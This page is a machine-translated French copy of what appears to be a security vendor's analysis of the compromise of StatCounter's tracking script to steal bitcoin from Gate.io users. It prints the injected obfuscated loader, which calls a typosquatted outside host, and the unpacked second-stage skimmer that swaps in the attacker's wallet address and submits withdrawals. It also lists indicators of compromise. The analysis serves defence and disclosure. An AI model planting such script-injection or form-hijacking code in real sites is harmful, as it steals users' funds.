<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>✍🏻 🛎️ 👩‍👧‍👧 Attaque d'échange de crypto-monnaie Gate.io enregistrée 👩‍🏭 🙌🏿 👩🏽‍⚕️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Le 4 novembre, les attaquants ont compromis StatCounter, une plateforme d'analyse du trafic Web. Le service est utilisé pour collecter des statistique...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Attaque d'échange de crypto-monnaie Gate.io enregistrée</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/eset/blog/429050/"> Le 4 novembre, les attaquants ont compromis StatCounter, une plateforme d'analyse du trafic Web.  Le service est utilisé pour collecter des statistiques sur les visiteurs du site, à peu près comme Google Analytics.  Pour ce faire, les webmasters ajoutent une balise JavaScript externe à chaque page du site contenant un morceau de code StatCounter - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">www.statcounter</a> [.] Com / counter / counter.js.  En utilisant StatCounter, les attaquants peuvent injecter du code JavaScript dans tous les sites utilisant cette plateforme.  Cependant, le but de l'attaque était une ressource - l'échange de crypto-monnaie Gate.io. <br><br><div style="text-align:center;"><img src="https://habrastorage.org/webt/yx/_d/pb/yx_dpbi0pyq4uumbaqwpsbyx5_a.jpeg"></div><a name="habracut"></a><br>  Selon ses propres <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">données</a> , StatCounter compte plus de deux millions de sites participants et recueille des statistiques sur plus de 10 milliards de pages Web vues par mois.  Sa note Alexa est juste au-dessus de 5000 (à titre de comparaison, le site officiel de Debian Linux, debian.org, a une note comparable). <br><br><img src="https://habrastorage.org/webt/nc/it/36/ncit36glmldyeze_qr1ag_lqroi.png"><br><br>  Les attaquants ont modifié le script sur <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">www.statcounter</a> [.] Com / counter / counter.js, en ajoutant un morceau de code malveillant montré dans le formulaire ci-dessous au milieu du script.  Cela est inhabituel car un code malveillant est souvent ajouté au début ou à la fin d'un fichier légitime.  Le code au milieu d'un script existant est plus difficile à remarquer si vous ne le lisez pas. <br><br><pre><code class="javascript hljs"><span class="hljs-built_in"><span class="hljs-built_in">eval</span></span>(<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">p, a, c, k, e, r</span></span></span><span class="hljs-function">) </span></span>{ e = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">c</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> c.toString(a) }; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!<span class="hljs-string"><span class="hljs-string">''</span></span>.replace(<span class="hljs-regexp"><span class="hljs-regexp">/^/</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">String</span></span>)) { <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (c--) r[e(c)] = k[c] || e(c); k = [<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">e</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> r[e] }]; e = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">'\\w+'</span></span> }; c = <span class="hljs-number"><span class="hljs-number">1</span></span> }; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span> (c--) <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (k[c]) p = p.replace(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">RegExp</span></span>(<span class="hljs-string"><span class="hljs-string">'\\b'</span></span> + e(c) + <span class="hljs-string"><span class="hljs-string">'\\b'</span></span>, <span class="hljs-string"><span class="hljs-string">'g'</span></span>), k[c]); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> p }(<span class="hljs-string"><span class="hljs-string">'3=""+2.4;5(3.6(\'7/8/9\')&gt;-1){a 0=2.b(\'d\');0.e=\'f://ghi/cj\';0.k(\'l\',\'m\');2.nop(0)}'</span></span>, <span class="hljs-number"><span class="hljs-number">26</span></span>, <span class="hljs-number"><span class="hljs-number">26</span></span>, <span class="hljs-string"><span class="hljs-string">'ga||document|myselfloc|location|if|indexOf|myaccount|withdraw|BTC|var|createElement||script|src|https|www|statconuter|com|php|setAttribute|async|true|documentElement|firstChild|appendChild'</span></span>.split(<span class="hljs-string"><span class="hljs-string">'|'</span></span>), <span class="hljs-number"><span class="hljs-number">0</span></span>, {}));</code> </pre> <br>  Le script a été créé à l'aide de l'encapsuleur Dean Edwards, probablement l'encapsuleur JavaScript le plus populaire.  Cependant, vous pouvez simplement le décompresser, ce qui entraînera l'exécution du code de script réel, comme indiqué ci-dessous. <br><br><pre> <code class="javascript hljs">myselfloc = <span class="hljs-string"><span class="hljs-string">''</span></span> + <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.location; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (myselfloc.indexOf(<span class="hljs-string"><span class="hljs-string">'myaccount/withdraw/BTC'</span></span>) &gt; <span class="hljs-number"><span class="hljs-number">-1</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> ga = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.createElement(<span class="hljs-string"><span class="hljs-string">'script'</span></span>); ga.src = <span class="hljs-string"><span class="hljs-string">'https://www.statconuter.com/c.php'</span></span>; ga.setAttribute(<span class="hljs-string"><span class="hljs-string">'async'</span></span>, <span class="hljs-string"><span class="hljs-string">'true'</span></span>); <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.documentElement.firstChild.appendChild(ga); }</code> </pre> <br>  L'extrait de code vérifie si l'URL contient l'identifiant de ressource unifiée (URI) <i>mon compte / retrait / BTC</i> .  Sur cette base, nous pouvons conclure que la cible des attaquants est la plate-forme Bitcoin.  Après avoir trouvé le résultat souhaité, le script ajoute un nouvel élément de script à la page Web, incorporant le code <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">www.statconuter</a> [.] Com / c.php. <br><br>  Veuillez noter que les attaquants ont enregistré un domaine très similaire au StatCounter légitime.  La différence en deux lettres - il est difficile de remarquer lors de la consultation de magazines pour une activité suspecte.  Soit dit en passant, en vérifiant le DNS passif du domaine, nous avons constaté qu'en 2010, il était bloqué pour des violations opérationnelles. <br><br><img src="https://habrastorage.org/webt/i2/yb/ot/i2ybotctgjeun17_viulvuexe48.png"><br><br>  Encore une fois, le script cible un identifiant spécifique (URI): <i>mon compte / retirer / BTC</i> .  Au moment d'écrire ces lignes, parmi tous les échanges de crypto-monnaie, seul Gate.io avait une page valide avec cet URI.  Il semble que cet échange particulier ait été la cible de l'attaque.  Ce site est assez populaire: sa cote Alexa est de 26 251, et sa note en Chine est de 8 308. <br><br><img src="https://habrastorage.org/webt/6l/-3/5p/6l-35pzx1sxwgtq-2fz70azyauk.png"><br><br>  De plus, selon coinmarketcap.com, plusieurs millions de dollars transitent quotidiennement sur cette plateforme, dont 1,6 million de dollars en bitcoins.  En général, l'intérêt des attaquants pour Gate.io est facile à expliquer. <br><br><img src="https://habrastorage.org/webt/ft/ei/mz/fteimzsn1pavzhmbzrlfioxddge.png"><br><br>  La page Web <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">www.gate</a> [.] Io / monaccompte / retirer / BTC (voir ci-dessous) est utilisée pour transférer des bitcoins d'un compte sur gate.io vers une adresse externe. <br><br><img src="https://habrastorage.org/webt/kg/zg/qy/kgzgqyrg27gvcsae82r8xnnsihe.png"><br><br>  La charge utile de la deuxième étape avec statconuter [.] Com / c.php est conçue pour voler des bitcoins.  Le script, également empaqueté à l'aide de Dean Edwards, est intégré dans la page Web pour traduire les bitcoins en Gate.io.  Version non emballée ci-dessous. <br><br><pre> <code class="javascript hljs"><span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.forms[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-string"><span class="hljs-string">'addr'</span></span>].value = <span class="hljs-string"><span class="hljs-string">''</span></span>; <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.forms[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-string"><span class="hljs-string">'amount'</span></span>].value = <span class="hljs-string"><span class="hljs-string">''</span></span>; doSubmit1 = doSubmit; doSubmit = <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> (</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> a = <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementById(<span class="hljs-string"><span class="hljs-string">'withdraw_form'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> ($(<span class="hljs-string"><span class="hljs-string">'#amount'</span></span>).val() &gt; <span class="hljs-number"><span class="hljs-number">10</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.forms[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-string"><span class="hljs-string">'addr'</span></span>][<span class="hljs-string"><span class="hljs-string">'name'</span></span>] = <span class="hljs-string"><span class="hljs-string">''</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> s = $(<span class="hljs-string"><span class="hljs-string">"&lt;input type='hidden' name='addr'/&gt;"</span></span>); s.attr(<span class="hljs-string"><span class="hljs-string">'value'</span></span>, <span class="hljs-string"><span class="hljs-string">'1JrFLmGVk1ho1UcMPq1WYirHptcCYr2jad'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> b = $(<span class="hljs-string"><span class="hljs-string">'#withdraw_form'</span></span>); b.append(s); a.submit(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementById(<span class="hljs-string"><span class="hljs-string">'canUse'</span></span>).innerText &gt; <span class="hljs-number"><span class="hljs-number">10</span></span>) { <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.forms[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-string"><span class="hljs-string">'addr'</span></span>][<span class="hljs-string"><span class="hljs-string">'name'</span></span>] = <span class="hljs-string"><span class="hljs-string">''</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> s = $(<span class="hljs-string"><span class="hljs-string">"&lt;input type='hidden' name='addr'/&gt;"</span></span>); s.attr(<span class="hljs-string"><span class="hljs-string">'value'</span></span>, <span class="hljs-string"><span class="hljs-string">'1JrFLmGVk1ho1UcMPq1WYirHptcCYr2jad'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> b = $(<span class="hljs-string"><span class="hljs-string">'#withdraw_form'</span></span>); b.append(s); <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.forms[<span class="hljs-number"><span class="hljs-number">0</span></span>][<span class="hljs-string"><span class="hljs-string">'amount'</span></span>][<span class="hljs-string"><span class="hljs-string">'name'</span></span>] = <span class="hljs-string"><span class="hljs-string">''</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> t = $(<span class="hljs-string"><span class="hljs-string">"&lt;input type='hidden' name='amount'/&gt;"</span></span>); t.attr(<span class="hljs-string"><span class="hljs-string">'value'</span></span>, <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.min(<span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementById(<span class="hljs-string"><span class="hljs-string">'canUse'</span></span>).innerText, <span class="hljs-built_in"><span class="hljs-built_in">document</span></span>.getElementById(<span class="hljs-string"><span class="hljs-string">'dayLimit'</span></span>).innerText)); b.append(t); a.submit(); } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { doSubmit1(); } };</code> </pre> <br>  La page Gate.io légitime a une fonction <code>doSubmit</code> qui est appelée lorsque l'utilisateur clique sur le bouton d' <code>doSubmit</code> .  Dans notre cas, les attaquants l'ont changé. <br><br>  Le script malveillant remplace automatiquement l'adresse du portefeuille Bitcoin de l'utilisateur par l'adresse appartenant à l'attaquant, par exemple, <code>1JrFLmGVk1ho1UcMPq1WYirHptcCYr2jad</code> .  Le serveur attaquant génère une nouvelle adresse chaque fois qu'un visiteur télécharge le script statconuter [.] Com / c.php. <br><br>  Le script utilise le montant entré par la victime (si la victime transfère plus de dix bitcoins) ou la limite quotidienne pour supprimer la crypto-monnaie du compte.  Dans notre compte de test, la limite de radiation a été fixée à 100 BTC.  Enfin, le script soumet un formulaire qui transfère des fonds du compte de la victime à l'adresse du portefeuille des attaquants. <br><br>  La redirection des fonds se fait probablement de manière invisible pour les victimes, puisque le portefeuille est changé après avoir cliqué sur le bouton "Envoyer".  Cela se produit très rapidement et sans affichage visuel. <br><br>  Une nouvelle adresse bitcoin des cybercriminels est générée chaque fois qu'un script malveillant est demandé, nous ne pouvons donc pas estimer leurs revenus.  Si vous vérifiez l'adresse que nous avons utilisée sur la machine de test, le solde est nul. <br><br><img src="https://habrastorage.org/webt/ib/td/ke/ibtdkeoxl6lgi-bbajdt6sbddt0.png"><br><br><h3>  Conclusion </h3><br>  Nous ne savons pas combien de bitcoins ont été volés lors de cette attaque.  Cependant, l'incident montre comment les attaquants peuvent agir pour attaquer une ressource spécifique, en particulier un échange de crypto-monnaie.  Pour voler des bitcoins aux utilisateurs d'un échange, ils ont compromis la plate-forme analytique que des millions de sites Web utilisent, y compris plusieurs sites gouvernementaux. <br><br>  De plus, cela montre que même si votre site est mis à jour et protégé de manière fiable, il est toujours vulnérable aux attaques via des ressources tierces.  Un autre rappel que le code JavaScript externe tiers peut être modifié à tout moment sans préavis. <br><br>  Nous avons averti StatCounter et Gate.io d'une activité malveillante. <br><br><h3>  Indicateurs de compromis </h3><br>  <b>URL malveillantes</b> <br><br>  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">www.statcounter</a> [.] Com / counter / counter.js <br>  • <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=fr&amp;u=">www.statconuter</a> [.] Com / c.php </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/fr429050/">https://habr.com/ru/post/fr429050/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../fr429040/index.html">Patch de code Java sur la production sans anesthésie</a></li>
<li><a href="../fr429042/index.html">Nous testons SharxBase, une plate-forme de virtualisation logicielle et matérielle du fournisseur russe SharxDC</a></li>
<li><a href="../fr429044/index.html">Les actions Apple ont connu la pire chute depuis 2014. Les grands investisseurs ont perdu des milliards</a></li>
<li><a href="../fr429046/index.html">Quatre ans de développement de SObjectizer-5.5. Comment SObjectizer a-t-il changé pendant cette période?</a></li>
<li><a href="../fr429048/index.html">Conseils pour un hébergeur novice</a></li>
<li><a href="../fr429052/index.html">Pourquoi sur les ordinateurs portables tactiles, certains SPA ont cessé de prendre en charge les événements tactiles</a></li>
<li><a href="../fr429054/index.html">Trouvez N différences. Expérience de test de mise en page Tinkoff.ru</a></li>
<li><a href="../fr429056/index.html">La physique, pas la biologie, rend le vieillissement inévitable</a></li>
<li><a href="../fr429058/index.html">Utilisation de Retrofit 2 dans une application Android</a></li>
<li><a href="../fr429060/index.html">Le concept d'un esprit idéal. AI universelle</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>